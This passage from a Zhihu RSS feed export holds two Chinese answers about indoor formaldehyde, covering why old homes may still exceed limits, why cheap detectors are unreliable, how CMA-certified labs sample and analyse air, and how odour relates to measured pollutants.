data-pid=\"nBUd02zI\">PS：冬季天气冷，很多人都不会开窗户通风，如果室内开着暖气会更容易加快甲醛的释放，室内的通风条件也不是很好的，就非常容易导致甲醛超标，最好是及时选择一个时间段去通风，可以不用一直通风</p>\n<p data-pid=\"ByjJPFji\"><b>对于老房子甲醛超标的原因，主要分为这三个原因</b></p>\n<p data-pid=\"ZYn29S5F\"><b>（1）家具的更新频率</b></p>\n<p data-pid=\"2Xe5QFA3\">如果家具的添置频率非常快的的话，又没有及时去除甲醛，会导致甲醛越来越多，释放跟不上导致超标，所以买了家具即使是不同时间进场，也要及时进行通风</p>\n<p data-pid=\"JT6jYiK0\"><b>（2）选用的家具板材环保性能是否达标</b></p>\n<p data-pid=\"3i-nKyt2\">板材的运用是非常大的，不好的板材甲醛含量会更高，释放的年限就会更久，一般甲醛的挥发长达数年之久</p>\n<p data-pid=\"5vuOzDit\"><b>（3）室内空间的大小</b></p>\n<p data-pid=\"2lokheMS\">如果是小户型的空间不建议放太多的家具，即使是买的都是环保标准内的家具，但是在同一空间内，还是会产生堆叠效应，就会导致甲醛超标的结果，这也是很容易被忽略的地方</p>\n<p data-pid=\"T30TelIn\">而对于甲醛是否超标，我们作为消费者只有这两种方式能够比较靠谱的检测出甲醛，第一种是上万元的检测仪</p>\n<p data-pid=\"QJAz3xl2\">市面上有很多甲醛检测仪，那些几十、几百的几千的检测仪都是不靠谱的，没有成本这么低的检测仪，所以不建议购买，精准的检测仪价格至少是在万元以上的。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-874b458af1e99555865f02a3d85388e1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1070\" data-rawheight=\"262\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"o_qw2j8q\">另外就是第三方检测机构</p>\n<p data-pid=\"cFVYebCJ\">所谓的第三方并不是都很靠谱，甚至有些为了推荐产品可以去修改甲醛数值（不要选择治理跟检测一起包办的），很多看似专业的设备可能只要几百元。</p>\n<p data-pid=\"6-SQqXk6\">最靠谱的是具有CMA资质的检测机构，一般这种这种的专业检测机构的检测结果是具有法律作用的不存在作假</p>\n<p data-pid=\"_w1wdui1\">选择第三方检测的缺点：只能检测一次，价格略高，对于正规的第三方普通消费者难以辨别</p>\n<p data-pid=\"AAJbnYqB\">居室在密闭12小时后检测，以0.1 mg/m³的作为限定值，如果居室在密封1小时后检测，就应该使用0.08 mg/m³作为限定值</p>\n<p data-pid=\"H_2chOuY\">还有一些没有CMA资质但是可以做专业检测的机构，还是一个道理，不选治理跟检测一起包办的，不然基本都是坑</p>\n<p data-pid=\"4GRFQk46\">最后就是除甲醛了，对于所有装修人都要面临最大的一个问题，实际上除甲醛最有效的方式</p>\n<p data-pid=\"XcheGCha\">就只有一种那就就是室内通风、加速空气的流通，其余的办法再多都没有通风来的实际</p>\n<p data-pid=\"0zSvk_e5\">可以选择在天气好的时候把窗户都打开透气通风，如果想要更快一点除甲醛，再选择一把工业电风扇，双重叠加上效率更快</p>\n<p data-pid=\"9v0SV6Fx\">网上还有所谓的闷放法，就是闷个几天再一次性打开，最好是不要一直闷着再打开，一会儿闷一会开是达不到一直通风的效果的，这里涉及到一个空气浓度梯度差，如果一直闷着的话空气里的甲醛释放越来越多，等释放到一个临界值以后甲醛就不会再释放了，所以夏季最好是一直开着通风，但是冬季是可以这样做的的，冬季温度较低，甲醛释放慢，间歇性的闷会让空气加热，有利用甲醛的挥发。</p>\n<p data-pid=\"BXniLzqa\"><b>新风系统</b>：只适合在天气不好不能开窗的时候使用，开窗稍微有一点风的状态效果都会比这个好上十倍，如果老房子没有做新风系统，也是可以选择再安装新风系统的</p>\n<p data-pid=\"8WG0SzSh\">包括但不限于增强通风的方法还有：排气扇以及新风空调都可以使用</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d88d1fbd022a01b9aa33ab70930c7e49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"656\" data-rawheight=\"382\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"Ln7wh19P\">绿植、活性炭这些去甲醛、吸附甲醛基本都是辅助作用，活性炭吸饱以后也不会再吸附了，不及时清理还会造成二次污染，所以还是多加一把风扇吹一吹吧</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8f5fdf0984475f520f44e8c930f6e8d3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"819\" data-rawheight=\"521\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\" data-qrcode-action=\"none\" data-tags=\"qrcode\"></p>\n<p data-pid=\"X0ijyqP0\">所以对于老房子产生的甲醛，如果没有家具的大变动以及翻新，基本上也不会超标，就算有只要及时进行通风达到标准，也是没有多大问题的。</p>\n<p data-pid=\"6bQhry5t\"><b>以上，欢迎知友补充讨论。</b></p>\n<p data-pid=\"PGDAIm3b\">非常荣幸受到@知乎家居@知乎科学@知乎健康的邀请，成为「家装真探社 01 号事件」的特邀真探！</p>\n<p data-pid=\"fnUeazbl\">本期事件，我调查的问题是「住了很多年的老房子，甲醛还会超标吗？」。作为一名从业者，我将从多方面进行调查取证，揭开甲醛隐藏的秘密。</p>\n<p data-pid=\"nq0jNih9\">如果想知道更多关于甲醛的问题，欢迎点击链接<a href=\"https://www.zhihu.com/roundtable/hchosecrets/\" class=\"internal\"><span class=\"invisible\">https://www.</span><span class=\"visible\">zhihu.com/roundtable/hc</span><span class=\"invisible\">hosecrets/</span><span class=\"ellipsis\"></span></a>，进入真探圆桌会议，与我一起探查真相！</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/gu-ren-gui-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">故人归</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/519981421/answer/2383109294?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">30 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475414741?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">新房装修完测甲醛，密闭了整整四天，测出来超标三倍，这个测量结果准确吗？</a><br><a href=\"http://www.zhihu.com/question/495646522?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">新房装修完后甲醛是不是都超标吗？</a><br>\n","link":"http://www.zhihu.com/question/519981421/answer/2383109294?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"甲醛检测合格，为什么家里味道还是很大？","date":"2022-03-13 07:12:34","description":"\n<p data-pid=\"-NVbpb4B\">甲醛与气味</p>\n<p data-pid=\"AiiYyF3E\">1.\t背景介绍\t1</p>\n<p data-pid=\"6T4ErqcM\">1.1.\t常见误区\t1</p>\n<p data-pid=\"_N0qvkQw\">1.1.1.\t数据之惑\t1</p>\n<p data-pid=\"E6tjRLb9\">1.1.2.\t气味之谜\t1</p>\n<p data-pid=\"bgXO2kTk\">2.\t实验测试\t1</p>\n<p data-pid=\"rOnj6Nrp\">2.1.\t检测迷雾\t1</p>\n<p data-pid=\"5HiWX0Rj\">2.1.1.\t乱花迷眼\t1</p>\n<p data-pid=\"jjsRKSyU\">2.1.2.\t4160之谜\t1</p>\n<p data-pid=\"VuSK34qW\">2.2.\t专业检测\t1</p>\n<p data-pid=\"p2xrUM3l\">2.2.1.\t解密CMA\t1</p>\n<p data-pid=\"2U33HDDa\">3.\t结果分析\t1</p>\n<p data-pid=\"FXGnB4am\">3.1.\t报告解读\t1</p>\n<p data-pid=\"mjoVPQiz\">3.2.\t案发现场\t1</p>\n<p data-pid=\"-g0FHKr4\">3.2.1.\t甲醛疑案\t1</p>\n<p data-pid=\"zi9DzzcM\">3.2.2.\t气味迷踪\t2</p>\n<p data-pid=\"eB0n7l4e\">3.3.\t相关研究\t3</p>\n<p data-pid=\"_amxPrFe\">4.\t最终结论\t3</p>\n<p data-pid=\"d-BzgISY\">4.1.\t真实关系\t3</p>\n<p data-pid=\"kqoVd5Yl\">4.2.\t应对方法\t3</p>\n<p data-pid=\"44hlTPhf\">4.2.1.\t甲醛应对\t3</p>\n<p data-pid=\"aurJ1Vdb\">4.2.2.\t气味问题\t3</p>\n<p data-pid=\"ibVJIeu4\">番外篇：无味杀手！</p>\n<p><br></p>\n<p data-pid=\"iL75k2r9\"><b>先说结论：</b></p>\n<p data-pid=\"jk_ZWIv2\"><b>因为室内常见空气污染物多达数百种，甲醛只是构成环境整体气味表现的因素之一，因此，气味大不一定甲醛超标，气味小不一定甲醛合格，无气味也不一定安全。但是，在很多情况下，室内甲醛的浓度和整体气味表现确实存在着一定的联系。</b></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"f7Hb8lD9\"><b>1.\t背景介绍</b></p>\n<p data-pid=\"SqfiX3iA\">从事人居环境安全相关工作和研究十多年以来，气味和甲醛超标之间的关系是被问到最多的一类问题。我接触到的大多数咨询者都觉得，气味大那就是甲醛超标，气味小就是安全的环境，然而事实到底是不是这样呢？</p>\n<p><br></p>\n<p data-pid=\"Xno5Q02x\"><b>1.1.\t常见误区</b></p>\n<p data-pid=\"PBYnU75y\"><b>1.1.1.\t数据之惑</b></p>\n<p data-pid=\"tMLaVBz8\">随着生活水平日益提高，大家越来越关注呼吸环境的健康，在入住新家（或工作场所）之前，越来越多的人会选择先做一些相关的检测，然后依据测试的数据来判断安全与否。现在市面上可供检测的机构和设备种类繁多，价格也各不相同，到底怎样的测试才能得到相对靠谱的结果、怎样的测试结果真的安全、同一时间不同的测试，或者不同时间同样的测试为何结果大相径庭？这些都是经常给大家带来巨大困扰的谜团。</p>\n<p data-pid=\"YJD2QIJ-\"><b>1.1.2.\t气味之谜</b></p>\n<p data-pid=\"Ee97_U1d\">明明各项测试数据显示达标的环境，为啥依然存在着让人不安的气味；明明自我感觉没什么味道的环境，甲醛数据超乎预期？气味和甲醛超标之间到底存在怎样的关系呢？下面我们将通过一些实际的案例来简单探讨一下这些谜题。</p>\n<p><br></p>\n<p data-pid=\"Seu7uNk5\"><b>2.\t实验测试</b></p>\n<p data-pid=\"-pctBzu2\"><b>2.1.\t检测迷雾</b></p>\n<p data-pid=\"kT6VL1gE\"><b>2.1.1.\t乱花迷眼</b></p>\n<p><br></p>\n<p data-pid=\"zkZIqnEI\">知乎有一句老话叫做：先问是不是，再问为什么。这句话在今天的议题中一样有着重要的意义。通常对于向我咨询某种检测数据下是否已经可以安全入住的朋友，我都会先搞清楚这个数据是怎么来的，是否具有参考价值，否则后续的所谓判断与建议，不过是在浪费彼此的时间而已。</p>\n<p data-pid=\"8zpLiWPN\">A.自购仪器：</p>\n<p data-pid=\"fJmqSrdK\">我们知道，现在通过电商平台可以买到各种各样的检测仪，价格从几十到上千不等，这些东西测出来的结果靠谱吗？</p>\n<p data-pid=\"MlZDSVju\">简单总结一下：价格低于一万的便携式仪器（除了极少两三种几千价位的泵吸式仪器之外），无论是测甲醛，还是测TVOC的，我都不建议轻易购买和使用。原因很简单：除了测不准，其他都挺好的。而且这个所谓的测不准，并不是具有普遍规律的偏低或者偏高，而是薛定谔的测不准。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0c9ab25f2c3139ffa5d8e5c7e54daab2_720w.png?rss\" data-caption=\"我对一些简易甲醛测试仪测试数据和同一环境下同时进行的标准测试结果的数据比对\" data-size=\"normal\" data-rawwidth=\"686\" data-rawheight=\"429\" data-watermark=\"watermark\" data-original-src=\"v2-0c9ab25f2c3139ffa5d8e5c7e54daab2\" data-watermark-src=\"v2-6e92ee7e2b1f00d083cc748a6cf2a15a\" data-private-watermark-src=\"v2-a881d8940d26bdb2437873a0bb0f3bc4\"></p>\n<p><br></p>\n<p data-pid=\"EmsTKWhT\">测不准的原因分几类，最便宜那些是传感器和宣称要测试的有害物之间没有明确的对应关系，这个果壳网的网友之前做过大面积拆解测试，比较多的是用风速传感器冒充甲醛/TVOC传感器的，还有一些根本都不是传感器，但凡有一点用，也不至于一点用也没有，实在让人绝望；</p>\n<p data-pid=\"N6oPi-ry\">另一类稍贵一点的，已经开始咬牙斥巨资（其实成本也挺便宜的）上了真正的甲醛传感器，但是由于质量不怎么样，同时舍不得（或搞不懂）泵吸式，用的廉价的扩散式方案，那准确度方面只能显而易见的拉跨。注意这种情况还只是针对甲醛测试仪，至于那些价格便宜而又号称能够测TVOC甚至同时还能测甲醛、TVOC、苯系物、氨之类的，不管您怎么看，我反正是看不懂，但我大受震撼，动弹不得，仿佛被厂家夺走了童贞。</p>\n<p data-pid=\"EDW2DgCz\">对于一万以上的便携式仪器，相对能够粗略测试一下甲醛的有采用光电光度法的理研（国产同类型的是泰宜康），以及电化学传感器法的英国PPM系列（PPM-HTV、PPM-400等）和美国4160，以及日本生产的一堆已经不那么便携的测试仪（GASTEC、光明理化、新宇宙等，市面上极为少见）；能够粗略测试一下TVOC的有英国的离子和美国的华瑞系列，都是紫外光离子化检测方式。这些东西虽然已经很贵了，但其实受限于体积，准确度和实验室标准流程做出来的结果还是不能相比，凑合用一下是可以了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0f5d182ac4df85097cd7be27f67c8f60_720w.jpeg?rss\" data-caption=\"PPM-HTV甲醛检测仪\" data-size=\"normal\" data-rawwidth=\"2936\" data-rawheight=\"3915\" data-watermark=\"watermark\" data-original-src=\"v2-0f5d182ac4df85097cd7be27f67c8f60\" data-watermark-src=\"v2-0d6752f00b894f9a46b96d519818ec4b\" data-private-watermark-src=\"v2-adac8d7974866f20221e3e94658ba394\"></p>\n<p data-pid=\"Y1wfYW4i\">上图我这个英国 PPM-htv 甲醛检测仪，价格一万以上，应该算是4160之外第二准确的便携式甲醛检测仪了，然而干扰气体依然一大堆，苯酚、乙醇、乙醛什么的，上图的测试数据这么高，你猜是真的甲醛这么高吗？非也，这是对着乙醇空瓶采了一下样的结果（连接了过滤器）。所以这些便携式目前咱只能说凑合用吧，三万多的进口4160在低浓度和高湿度环境下尚且偏差严重呢，就更别说大家在某些电商平台上买到的那些几百几千的所谓高精度甲醛测试仪了。</p>\n<p><br></p>\n<ol><li data-pid=\"9cGDoyH6\">各种家电上面自带的检测仪：</li></ol>\n<p data-pid=\"cvdUYSKJ\">这种东西抛开准确性不谈，还是有它存在的道理，这里我实在不知道怎么评价比较合适而且安全，就暂时不做评价了。大概，也许，说不好也有一些还是不错的吧。</p>\n<p><br></p>\n<ol><li data-pid=\"5W8Pl-KK\">各种漂流检测：</li></ol>\n<p data-pid=\"gEGWz38L\">根据所用仪器的价位，以及是否有定期校准来初步判断可靠性。便携式的准确度参考A部分内容来判断（前不久我一个朋友对照测试了一批漂流检测仪后发现某大机构就存在测试结果对比标准测试普遍偏低的现象）。非便携式的如果是集成小型光度计的那种化学法检测的仪器（八合一、十合一不在讨论范围内），对甲醛的检测准确度会比便携式的相对更准确一些，当然这只能用来测甲醛，对于苯系物、TVOC等其他气体的测量，我只见过南方一家专业机构有做，根据之前遇到的几起案例来说，至少对于苯的检测准确度，我抱持着巨大的保留意见。如果是 GASTEC 的检测管式，理论上会稍好一点，不过我目前还没见过有漂流这玩意的。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-909d3507f88f21b3af946d2fba32f84d_720w.jpg?rss\" data-caption=\"日本GASTEC快速气体检测管\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<ol><li data-pid=\"H50a71tR\">机构上门检测：</li></ol>\n<p data-pid=\"14TBBmHX\">非CMA机构若采用上面C部分所述质量尚可的集成式光度计认真检测，基本也可以得到一个相对靠谱的甲醛检测结果；专业检测机构（具备CMA资质或更多资质）就更放心一点，但是这些年我也见过不少专业机构做事欠专业的，怎么说呢，凡事无绝对吧，不敬业的人干啥都会出问题。</p>\n<p><br></p>\n<p data-pid=\"UR0s-qRm\"><b>2.1.2.\t4160之谜</b></p>\n<h3>上述D中我说到，进口4160算是相对靠谱的便携式甲醛检测仪（实际上已经是目前为止准确度最好的即时读数型甲醛检测仪了），不过这里我要举一个反例，告诉我们凡事都有例外，不能唯设备论。</h3>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-9808610d689e1c1f288d75b907869e8c_720w.jpg?rss\" data-caption=\"4160甲醛检测仪\" data-size=\"normal\" data-rawwidth=\"684\" data-rawheight=\"539\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"WLB_bu7L\">几年前我接到一个来自西部某大城市的读者朋友的咨询，告诉我住了七八年的老房子测出甲醛超标严重该怎么办才好，当然老规矩我还是先问怎么测的，对方说是当地环保局的一个朋友带着进口4160测试出的。哎呦不错哦，4160还是能打的。不过当我看了现场视频和照片，询问了很多问题后，认为这个结果不太能够让我接受。百思不得其解之下，我让她帮忙确认一下这个4160的使用时间和最近校准时间。后来知道已经用了十来年（这玩意传感器寿命一般是三年左右），最近一次校准是3年前（每年都要校准才行）。更多的情报显示：当地环保局当初购进两台4160，日常用的就是这一台，常年四处漂流，朋友圈里哪家装修去哪家。另一台几乎不使用，只在需要迎接检查的时候才拿出来展示一下。我觉得这个案例告诉了我两个事情：一是再贵的仪器也得正确使用，生产队的驴都要有休息的时间；二是很多应该很专业的机构都备不住或多或少存在一些不那么专业的人，不能根据一个人的身份盲目相信他做的事情就应该是靠谱的。</p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"-lfMFOwO\"><b>2.2.\t专业检测</b></p>\n<p data-pid=\"__y0LN5q\"><b>2.2.1.\t解密CMA</b></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"5CTAa1Iq\">上面说了，我们普通人相对能够找到的最靠谱的检测方式，就是寻找当地有CMA资质的第三方专业机构上门采样检测，那这种机构到底是怎样完成检测的呢？</p>\n<p data-pid=\"E8daX_Xy\">首先是上门采样，机构会提前告知客户根据实际需求选择合理的提前封闭时间（一小时（国标50325）或12小时（国标18883）），封闭时间到了之后会进入待测试房间进行采样。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b74e21bcfea1fa3cbdcec894d6f6d0ed_720w.png?rss\" data-caption=\"最常用到的采样器之一：北京劳保所的QC-2型双通道大气采样器\" data-size=\"normal\" data-rawwidth=\"603\" data-rawheight=\"803\" data-watermark=\"watermark\" data-original-src=\"v2-b74e21bcfea1fa3cbdcec894d6f6d0ed\" data-watermark-src=\"v2-69c665b8b860686edc2c6c407ee3cdaa\" data-private-watermark-src=\"v2-11656ee4734a4964b84cc103015d2827\"></p>\n<p data-pid=\"ugghnar-\">采样阶段用到的核心仪器就是上图这样的大气采样仪，最常见的就是这种北京劳保所生产的，贵一点的还有崂山应用仪器厂之类的，不差钱机构——比如国检中心那就是直接上下面这个了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6adf845dea2d1b3e4293c163e65c9983_720w.jpg?rss\" data-caption=\"GILIAN采样器\" data-size=\"normal\" data-rawwidth=\"575\" data-rawheight=\"669\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"m4-N-6hC\">我们看到上上图的北劳的采样器上面，左右各连接了一个透明玻璃气泡管和一支细长的不锈钢管，这俩分别是干啥的呢？左边的不锈钢管，一般是TVOC吸附管，里边有吸附质，用于采集挥发性有机化合物样本；右边的玻璃气泡管一般是用于采集空气中的甲醛（或氨气）的采样管，用于收集甲醛（或氨）的样本。采样器的主体就是一个恒流抽气泵，经过规定时间内的强制抽吸，让室内空气流经采样管，待测的有害气体物质通过固体或者液体的吸附质被收集在采样管中，以待拿回实验室分析化验。</p>\n<p data-pid=\"e0zDMH0z\">样本采集回实验室后，实验室人员会依据相关国家标准如 GBT 18204.2-2014 《公共场所卫生检验方法 第2部分：化学污染物》等，使用标准物质制作待测污染物的标准曲线，使用化学法（甲醛、氨等）或者气相色谱法（苯系物、TVOC等）对采集的样本进行定量分析，得出准确的结果。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c1abeb9b7fb4780198e8950f69e49297_720w.jpg?rss\" data-caption=\"用于甲醛、氨等测试的核心仪器——分光光度计\" data-size=\"normal\" data-rawwidth=\"864\" data-rawheight=\"640\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7ecf7bb586eca7b78b951ea00da6cf5c_720w.jpg?rss\" data-caption=\"用于苯系物、TVOC等测试的核心仪器——气相色谱仪\" data-size=\"normal\" data-rawwidth=\"1267\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-784e587bcd109c7b16dcd793f9145702_720w.jpg?rss\" data-caption=\"部分标准物质\" data-size=\"normal\" data-rawwidth=\"1268\" data-rawheight=\"1691\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9ed39fbe08b08d19622eed0ebbc85d74_720w.jpg?rss\" data-caption=\"正在展开的色谱图\" data-size=\"normal\" data-rawwidth=\"1267\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"nkJrtzuA\">详细的原理这里就不展开说了，大家有兴趣了解的话可以读一下相关国标，比如上文提到的重要标准：GBT 18204.2-2014 《公共场所卫生检验方法 第2部分：化学污染物》，里边对各种室内常见污染物的测试原理、方法和流程都有无比详尽的描述。</p>\n<p><br></p>\n<p data-pid=\"bXU_npGv\"><b>3.\t结果分析</b></p>\n<p data-pid=\"KJjuT7Jn\"><b>3.1.\t报告解读</b></p>\n<p data-pid=\"YlxmDUXC\">经过上述专业机构测试之后我们会拿到一份检测报告，对于这个报告，我们需要关注以下信息：</p>\n<ol><li data-pid=\"Iq9Nkqyb\">封面顶部是否有CMA印章，这意味着该机构到底是不是具备了本报告涉及项目的测试资质（能力）。当然如果除了CMA印章外还有CNAS，CAL之类的更好，多多益善属于是。</li></ol>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-addfa55d9ffbbe7001efc081a146de85_720w.jpg?rss\" data-caption=\"报告封面顶端的各种资质印章\" data-size=\"normal\" data-rawwidth=\"1004\" data-rawheight=\"212\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"77sT5jb3\">报告封面顶端就是该机构取得的相关资质，最左边红色的印章就是最常见的CMA认证，一般情况下有这个就可以了。</p>\n<ol><li data-pid=\"brw22fIk\">报告封面的委托人是不是本人，项目名称是否正确——别笑，我就见过报告寄错了人的。</li></ol>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4ea0414d7d322b574e689b24074d4c07_720w.jpg?rss\" data-caption=\"采样环境参数\" data-size=\"normal\" data-rawwidth=\"584\" data-rawheight=\"240\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<ol>\n<li data-pid=\"xpQhgFy5\">报告上的检测环境参数，如上图示，温度，湿度、大气压，门窗关闭时间等。这些参数很重要，因为室内环境中有害物的浓度是不停变化的，上述参数都是重要的影响因素，接下来我们看到的测试数据都指的是<b>在上述环境下</b>测试的结果，不能代表其他环境还是这样——这一点是尤为重要的，很多朋友有个误解就是任何专业机构测出来的数据应该一致，任何时间测都是这种污染水平，这是不对的，无论多准确的检测，都只能反应该采样房间<b>当时</b>的污染水平。其他时间测出来和这个不一样是正常的，要一样才是巧合。当然，在一定跨度的时间段内，温湿度、大气压、空气交换率、封闭时间等条件都差不多的情况下，某个时间点的测试结果还是可以去近似评估该房间近期的污染状况的。</li>\n<li data-pid=\"ldlalcVU\">测试结果</li>\n</ol>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a92448c08f702d50bae62b2c716a2e1c_720w.jpg?rss\" data-caption=\"检测报告数据页\" data-size=\"normal\" data-rawwidth=\"910\" data-rawheight=\"795\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"Nr7DdQIm\">上图是一个检测报告的数据页，我们可以从中看到各个房间各种有害物的测试数据，比如上图中就对甲醛、苯、氨、TVOC和氡五项做了检测。我们可以根据下部依据的国标限值对比判断各项有害物是否超标和超标是否严重。这里我们肯定发现了一个问题：没有关于气味的数据和描述对不对？</p>\n<p data-pid=\"vkwNhc_u\">是的，目前为止，国家还没有将气味这一指标纳入室内环境检测相关的标准体系之内，甚至连统一的测试方法标准都还没有。这是因为，气味来源于嗅觉感知，更多是人的主观判定结果，对气味的量化评估技术难度较大，虽然气味本质上由VOCS综合造成，但很多对人来说很明显的气味都还不能完全依靠仪器数据来准确反应，更多需要依赖多位专业嗅辩员评价结果的均值，测试成本还比较高。不过随着大家对气味的关注越来越大，对这方面的研究也相应增长，但在涉及室内环境方面的规定目前主要还是集中在建材本身而非整体环境，如针对人造板的 LY∕T3236-2020《人造板及其制品气味分级及其评价方法》、针对定制家居的T／GCHA_1.3—2018《定制家居产品_人造板定制衣柜_第3部分_有害物质限量及气味等级》、针对胶黏剂的 HG/T 4065-2008《胶粘剂气味评价方法》、针对皮革制品的 QB/T 2725-2005《皮革气味的测定》、针对学校操场跑道的 GB 36246-2018《中小学合成材料面层运动场地》等，可参考的方法极少而且不成体系，有待进一步完善。</p>\n<p data-pid=\"tUFeWosI\">对于上图的测试结果，我们不难发现，四个房间的甲醛和TVOC都有不同程度的超标，其他项目尚可，在现场的感知情况来看，四个房间都有不同程度的”装修味“，那么这些气味和污染物之间到底有怎样的关系呢？我们走进”案发现场“来做一下初步的调查。</p>\n<p><br></p>\n<p data-pid=\"RHlo2VDR\"><b>3.2.\t案发现场</b></p>\n<p data-pid=\"KJ_qwAlP\"><b>3.2.1.\t甲醛疑案</b></p>\n<p data-pid=\"WKDzbg8S\">这里边最让咨询者意外的是主卧（主人房），这个房间面积较大，他认为封闭12小时后闻到的气味是最小的，自己用来定制衣柜的还都是挺贵的进口板材，原本以为这个房间最环保，但是测试的结果无论甲醛还是TVOC的数据都是最高，所以觉得很难理解。我调查了一下现场污染源，发现室内主要的人造板制品就是定制衣柜了，但这个定制衣柜用到的板材确实是质量还行的某进口大牌板材，虽然环保上不如无甲醛板材，排放等级也还是拿了F4的，在这样比较小的装载量下，理论上不会造成严重的甲醛污染，其他重点可疑的对象床垫、床和床头柜、地板、踢脚线之类的质量也都很好，那么最主要的污染来自什么地方呢？</p>\n<p data-pid=\"NRIYqEBn\">我注意到，在床头的墙面做了几个平米的软包装饰，根据询问得知，硬包内部使用的是来历不明的细木工板（俗称大芯板），根据一贯经验可知，这种用于软硬包内部的细木工板，除非主人有明确要求，一般默认都是使用最廉价的裸板，这种板材的甲醛排放往往连强制标准都达不到，用量稍微一大，就很容易造成严重的甲醛以及VOC的散发。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-880d968cff51dd5267ac934942ae7633_720w.jpg?rss\" data-caption=\"常见或不常见用于打底、造型的各种廉价细木工板，有一些类型的甲醛排放量甚至低于老国标E2级\" data-size=\"normal\" data-rawwidth=\"1268\" data-rawheight=\"456\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7650ac50bdad01f813aa3dd407b84b4d_720w.jpg?rss\" data-caption=\"高质量的细木工板\" data-size=\"normal\" data-rawwidth=\"1266\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"qoYtlLrH\">后来我建议这个咨询者将床头的软包背部的衬板更换成大厂的裸板OSB，表层芯板换成聚酯纤维板，对近距离闻起来有明显气味的窗帘进行了清洗和晾晒（降低甲醛和VOC散发）之后再悬挂，之后在类似环境下复测，除TVOC外各项数据都降到了国标限值之下。但是出现了一些新的气味，这个是更换的裸板OSB引入的，主要是松木原料（OSB以松木为主原料，，使用杨木的厂家相对少一些。松木OSB用量大了往往有明显的松脂气味，也会让TVOC总量有所上升）散发的萜烯类化合物，对健康倒是没有什么大影响（日本有不少研究还认为木材抽提物有各种保健作用），随着时间的增加也会不断减弱直至闻不到。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-811b6e53bcbae4d775614db83ea897f9_720w.jpg?rss\" data-caption=\"OSB——定向结构刨花板，大厂以MDI胶黏剂为主制作，多为无醛板，图为普通OSB裸板正面\" data-size=\"normal\" data-rawwidth=\"1179\" data-rawheight=\"613\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p 